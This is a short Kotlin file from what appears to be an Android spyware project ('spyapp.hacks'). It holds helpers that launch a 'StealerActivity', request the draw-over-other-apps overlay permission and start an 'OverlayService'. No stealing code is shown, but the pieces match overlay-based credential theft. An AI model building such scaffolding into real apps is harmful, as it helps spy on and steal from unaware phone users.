package npo.kib.spyapp.hacks

import android.content.Context
import android.content.Intent
import android.provider.Settings

fun Context.startStealerActivity() {
    startActivity(Intent(this, StealerActivity::class.java))
}

fun Context.requestOverlayPermission() {
    val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
    startActivity(intent)
}

fun Context.startOverlayService() {
    startService(Intent(this, OverlayService::class.java))
}
